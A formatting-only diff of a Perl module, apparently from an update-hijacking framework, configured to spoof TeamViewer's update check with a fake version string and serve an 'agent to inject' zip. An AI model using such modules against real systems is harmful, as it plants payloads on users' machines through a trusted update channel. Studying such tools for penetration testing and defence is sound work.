@@ -25,48 +25,53 @@ package modules::teamviewer;
 use strict;
 use Data::Dump qw(dump);
 
-my $base=
-{
-    'name' => 'teamviewer',
+my $base = {
+    'name'    => 'teamviewer',
     'version' => '1.0',
-    'appver' => '< 5.1.9385',
-    'author' => [ 'German Rodriguez < grodriguez +[AT]+ infobytesec.com >' ],
-    'description' => qq{TeamViewer},    
-    'vh' => 'download.teamviewer.com',
-    'request' => [
-		    {
-		    'req' => '/download/update/TVversion', #regex friendly
-		    'type' => 'string', #file|string|agent|install
-		    'method' => '', #any
-		    'bin'    => '0',
-		    'string' => "6.0.32",
-		    'parse' => '1',
-		    'file' => '',
-		    },
-		    {
-		    'req' => '.zip', #regex friendly
-		    'type' => 'agent', #file|string|agent|install
-		    'method' => '', #any
-		    'bin'    => 1,		    
-		    'string' => '',
-		    'parse' => '0',
-		    'file' => ''
-		    },
+    'appver'  => '< 5.1.9385',
+    'author'  => ['German Rodriguez < grodriguez +[AT]+ infobytesec.com >'],
+    'description' => qq{TeamViewer},
+    'vh'          => 'download.teamviewer.com',
+    'request'     => [
+        {   'req'  => '/download/update/TVversion', #regex friendly
+            'type' => 'string',                     #file|string|agent|install
+            'method' => '',                         #any
+            'bin'    => '0',
+            'string' => "6.0.32",
+            'parse'  => '1',
+            'file'   => '',
+        },
+        {   'req'    => '.zip',                     #regex friendly
+            'type'   => 'agent',                    #file|string|agent|install
+            'method' => '',                         #any
+            'bin'    => 1,
+            'string' => '',
+            'parse'  => '0',
+            'file'   => ''
+        },
     ],
-    #Options		    
-    'options' => {  'agent'  => { 'val' => './agent/agent.zip', 'desc' => 'Agent to inject'},
-		    'enable' => { 'val' => 1, 
-			    	  'desc' => 'Status'},
-                   'rnd1'  => { 'val' => 'isrcore::utils::RndNum(2)',
-                                 'hidden' => 1,
-				'dynamic' =>1,},
-                   'rnd2'  => { 'val' => 'isrcore::utils::RndAlpha(isrcore::utils::RndNum(1))',
-                                 'hidden' => 1,
-				'dynamic' =>1,},
-                                                                                       			    	  
-		 }
-};
 
+    #Options
+    'options' => {
+        'agent' =>
+            { 'val' => './agent/agent.zip', 'desc' => 'Agent to inject' },
+        'enable' => {
+            'val'  => 1,
+            'desc' => 'Status'
+        },
+        'rnd1' => {
+            'val'     => 'isrcore::utils::RndNum(2)',
+            'hidden'  => 1,
+            'dynamic' => 1,
+        },
+        'rnd2' => {
+            'val'    => 'isrcore::utils::RndAlpha(isrcore::utils::RndNum(1))',
+            'hidden' => 1,
+            'dynamic' => 1,
+        },
+
+    }
+};
 
 ##########################################################################
 # FUNCTION      new
